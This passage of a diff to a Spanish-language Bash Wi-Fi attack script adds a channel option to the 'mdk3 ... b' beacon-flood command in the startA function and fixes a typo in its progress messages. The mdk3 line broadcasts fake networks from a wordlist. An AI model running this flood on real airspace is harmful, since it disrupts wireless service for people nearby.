-							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							clear
-							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 							sleep .25
 							i=$((i+1))
 							if [[ $i == $linesF ]]; then
@@ -998,23 +993,23 @@ function startA(){
 			if [[ $tm =~ ^-?[0-9]+$ ]]; then
 
 				echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
-				mdk3 $inter b -f $dicR -a -s 1000 &
+				mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 				BFPID=$!
 				mapfile -t redes < $dicR
 				linesF=$(cat $dicR | wc -l) > /dev/null 2>&1
 				bi=0
 				for i in $(seq $tm); do
 						clear
-						echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+						echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 						sleep .25
 						clear
-						echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+						echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 						sleep .25
 						clear
-						echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+						echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 						sleep .25
 						clear
-						echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
+						echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$bi]}${endC}"
 						sleep .25
 						bi=$((bi+1))
 						if [[ $bi == $linesF ]]; then
@@ -1030,23 +1025,23 @@ function startA(){
 
 			elif [ $tm == 'i' ]; then
 				echo -e " ${yC}\n [*] ${endC}${bC} Iniciando ataque Beacon Flood ...${endC}"
-				mdk3 $inter b -f $dicR -a -s 1000 &
+				mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 				BFPID=$!
 				mapfile -t redes < $dicR
 				linesF=$(cat $dicR | wc -l) > /dev/null 2>&1
 				i=0
 				while true; do
 					clear
-					echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					clear
-					echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					clear
-					echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					clear
-					echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					i=$((i+1))
 					if [[ $i == $linesF ]]; then
@@ -1080,7 +1075,7 @@ function startA(){
 				tm=i
 				echo -e "\n ${yC} [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
 				#Inicio de ataque
-				mdk3 $inter b -f $dicR -a -s 1000 &
+				mdk3 $inter b -f $dicR -c $ch -a -s 1000 &
 				sleep 2
 				BFPID=$!
 				mapfile -t redes < $dicR
@@ -1089,16 +1084,16 @@ function startA(){
 				i=0
 				while true; do
 					clear
-					echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					clear
-					echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					clear
-					echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					clear
-					echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
+					echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes publicadas:${endC} ${yC}${redes[$i]}${endC}"
 					sleep .25
 					i=$((i+1))
 					if [[ $i == $linesF ]]; then
